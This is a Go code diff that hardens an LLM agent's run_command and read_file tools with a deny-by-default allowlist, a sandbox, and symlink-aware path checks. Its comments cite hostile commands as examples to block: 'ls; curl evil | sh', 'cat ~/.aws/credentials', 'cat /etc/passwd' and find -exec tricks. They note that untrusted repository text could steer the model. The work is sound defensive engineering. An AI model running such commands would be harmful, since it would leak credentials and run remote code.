@@ -7,10 +7,11 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"time"
 
 	"github.com/tzone85/nexus-dispatch/internal/agent"
 	"github.com/tzone85/nexus-dispatch/internal/llm"
-	"github.com/tzone85/nexus-dispatch/internal/shellexec"
+	"github.com/tzone85/nexus-dispatch/internal/runtime"
 )
 
 const (
@@ -78,6 +79,7 @@ type Investigator struct {
 	model            string
 	maxTokens        int
 	commandAllowlist []string
+	sandbox          runtime.CommandSandbox
 }
 
 // NewInvestigator creates an Investigator backed by the given LLM client.
@@ -89,66 +91,42 @@ func NewInvestigator(client llm.Client, model string, maxTokens int) *Investigat
 	}
 }
 
-// SetCommandAllowlist configures the list of allowed command prefixes for
-// run_command tool calls. An empty list allows all commands (backward compat).
+// SetCommandAllowlist configures the allowlist for run_command tool calls.
+// Matching is argv-aware (see internal/runtime/allowlist.go). An EMPTY
+// allowlist denies every command — the old "empty = allow all" behaviour let
+// a model whose context contains untrusted repository text run anything.
 func (inv *Investigator) SetCommandAllowlist(allowlist []string) {
 	inv.commandAllowlist = allowlist
 }
 
-// isCommandAllowed checks whether a command is permitted by the allowlist.
-// If the allowlist is empty, all commands are allowed for backward compatibility.
-// Commands are run through `sh -c` (via shellexec), so any shell metacharacter
-// that could chain commands, redirect I/O, or escape the allowlist prefix is
-// rejected — matching the hardened native-runtime check in
-// internal/runtime/gemma.go (H9). Investigator command strings originate from an
-// LLM whose context includes untrusted repository file contents, so a prefix
-// like "cat " must not be rideable into `cat secret > /path` or `find . -exec …`.
+// SetSandbox overrides the sandbox used for run_command. nil (default) uses
+// runtime.DefaultSandbox(), which resume.go/req.go configure from nxd.yaml.
+func (inv *Investigator) SetSandbox(sb runtime.CommandSandbox) {
+	inv.sandbox = sb
+}
+
+func (inv *Investigator) sandboxOrDefault() runtime.CommandSandbox {
+	if inv.sandbox != nil {
+		return inv.sandbox
+	}
+	return runtime.DefaultSandbox()
+}
+
+// investigatorCommandTimeout bounds a single run_command.
+const investigatorCommandTimeout = 2 * time.Minute
+
+// isCommandAllowed reports whether command passes the allowlist when run in
+// repoPath. It delegates to runtime.CheckCommand, which rejects shell
+// metacharacters, exec-style flags (find -exec, go test -exec, ...), env-var
+// prefixes, and any absolute / ~ / .. path that leaves the repository — so
+// `cat /etc/passwd`, `cat ~/.aws/credentials` and `find / -name '*.pem'` are
+// all denied even though cat and find are allowlisted.
 func (inv *Investigator) isCommandAllowed(command string) bool {
-	trimmed := strings.TrimSpace(command)
-	if trimmed == "" {
-		return false
-	}
+	return inv.checkCommand(command, "") == nil
+}
 
-	// Reject shell metacharacters FIRST, before the empty-allowlist
-	// short-circuit. Otherwise a config with an explicitly empty
-	// command_allowlist would allow injection like "ls; curl evil | sh".
-	// The set mirrors gemma.go's forbidden set: chaining (;&|), expansion
-	// ($`), redirection (<>), newlines/tab/CR, NUL, and backslash escapes.
-	const forbidden = ";&|$`<>\n\r\t\x00\\"
-	if strings.ContainsAny(trimmed, forbidden) {
-		return false
-	}
-
-	// Even without a metacharacter, an allowlisted binary that itself launches
-	// other programs defeats the allowlist. `find`'s -exec/-execdir/-ok/-okdir
-	// run arbitrary commands (with the `+` terminator no `;` is needed), so
-	// reject them as whole tokens regardless of which tool precedes them.
-	for _, tok := range strings.Fields(trimmed) {
-		switch tok {
-		case "-exec", "-execdir", "-ok", "-okdir":
-			return false
-		}
-	}
-
-	if len(inv.commandAllowlist) == 0 {
-		return true // backward compat: no allowlist configured = no prefix restriction
-	}
-
-	lower := strings.ToLower(trimmed)
-	for _, pattern := range inv.commandAllowlist {
-		p := strings.ToLower(strings.TrimSpace(pattern))
-		if p == "" {
-			continue
-		}
-		if lower == p {
-			return true
-		}
-		// Allow if command starts with pattern followed by a space.
-		if strings.HasPrefix(lower, p+" ") {
-			return true
-		}
-	}
-	return false
+func (inv *Investigator) checkCommand(command, repoPath string) error {
+	return runtime.CheckCommand(command, inv.commandAllowlist, repoPath)
 }
 
 // Investigate runs the 7-phase investigation loop on the repository at
@@ -239,7 +217,7 @@ func (inv *Investigator) Investigate(ctx context.Context, repoPath string) (*Inv
 }
 
 // handleReadFile reads a file relative to repoPath with path traversal
-// protection and content truncation.
+// protection (lexical AND after symlink resolution) and content truncation.
 func (inv *Investigator) handleReadFile(repoPath string, args json.RawMessage) string {
 	var params struct {
 		Path string `json:"path"`
@@ -248,19 +226,8 @@ func (inv *Investigator) handleReadFile(repoPath string, args json.RawMessage) s
 		return fmt.Sprintf("error: invalid read_file arguments: %v", err)
 	}
 
-	// Resolve and validate the path stays within repoPath
-	absRepo, err := filepath.Abs(repoPath)
+	absTarget, err := resolveRepoPath(repoPath, params.Path)
 	if err != nil {
-		return fmt.Sprintf("error: cannot resolve repo path: %v", err)
-	}
-	target := filepath.Join(absRepo, params.Path)
-	absTarget, err := filepath.Abs(target)
-	if err != nil {
-		return fmt.Sprintf("error: cannot resolve target path: %v", err)
-	}
-
-	// Path traversal protection: resolved path must be under the repo root
-	if !strings.HasPrefix(absTarget, absRepo+string(filepath.Separator)) && absTarget != absRepo {
 		return "error: path traversal detected — access denied"
 	}
 
@@ -276,8 +243,44 @@ func (inv *Investigator) handleReadFile(repoPath string, args json.RawMessage) s
 	return content
 }
 
-// handleRunCommand executes a shell command in the repo directory with output
-// truncation.
+// resolveRepoPath joins rel onto repoPath and verifies the result stays inside
+// the repository both lexically and after filepath.EvalSymlinks — a committed
+// symlink pointing at /etc or $HOME must not be readable through the tool.
+// Mirrors runtime/gemma.go safePath.
+func resolveRepoPath(repoPath, rel string) (string, error) {
+	absRepo, err := filepath.Abs(repoPath)
+	if err != nil {
+		return "", err
+	}
+	if filepath.IsAbs(rel) || strings.HasPrefix(rel, "~") {
+		return "", fmt.Errorf("absolute or home-relative path")
+	}
+	target := filepath.Clean(filepath.Join(absRepo, rel))
+	if !insideDir(target, absRepo) {
+		return "", fmt.Errorf("outside repository")
+	}
+	realRepo, err := filepath.EvalSymlinks(absRepo)
+	if err != nil {
+		realRepo = absRepo
+	}
+	realTarget, err := filepath.EvalSymlinks(target)
+	if err != nil {
+		// Missing file: the lexical check above already passed; let ReadFile
+		// report the real error.
+		return target, nil
+	}
+	if !insideDir(realTarget, realRepo) {
+		return "", fmt.Errorf("symlink escapes repository")
+	}
+	return realTarget, nil
+}
+
+func insideDir(path, dir string) bool {
+	return path == dir || strings.HasPrefix(path, dir+string(filepath.Separator))
+}
+
+// handleRunCommand executes an allowlisted command in the repo directory via
+// the configured sandbox, with output truncation.
 func (inv *Investigator) handleRunCommand(ctx context.Context, repoPath string, args json.RawMessage) string {
 	var params struct {
 		Command string `json:"command"`
@@ -286,22 +289,21 @@ func (inv *Investigator) handleRunCommand(ctx context.Context, repoPath string, 
 		return fmt.Sprintf("error: invalid run_command arguments: %v", err)
 	}
 
-	if !inv.isCommandAllowed(params.Command) {
-		return fmt.Sprintf("error: command not in allowlist: %s", params.Command)
+	if err := inv.checkCommand(params.Command, repoPath); err != nil {
+		return fmt.Sprintf("error: command not in allowlist: %s (%v)", params.Command, err)
+	}
+	argv, err := runtime.TokenizeCommand(params.Command)
+	if err != nil {
+		return fmt.Sprintf("error: %v", err)
 	}
 
-	// Investigator commands come from the operator-configured allowlist
-	// (see isCommandAllowed above). Route through shellexec so Windows
-	// pipelines (cmd.exe) and NXD_SHELL overrides work the same as the
-	// gemma runtime's run_command tool — direct `sh -c` would silently
-	// fail on native Windows.
-	cmd := shellexec.CommandContext(ctx, params.Command)
-	cmd.Dir = repoPath
-
-	output, err := cmd.CombinedOutput()
-	result := string(output)
-	if err != nil {
+	res, err := inv.sandboxOrDefault().Exec(ctx, repoPath, argv, investigatorCommandTimeout)
+	result := res.Combined()
+	switch {
+	case err != nil:
 		result = result + "\nexit error: " + err.Error()
+	case res.ExitCode != 0:
+		result = result + fmt.Sprintf("\nexit error: exit status %d", res.ExitCode)
 	}
 
 	if len(result) > maxCommandOutputChars {
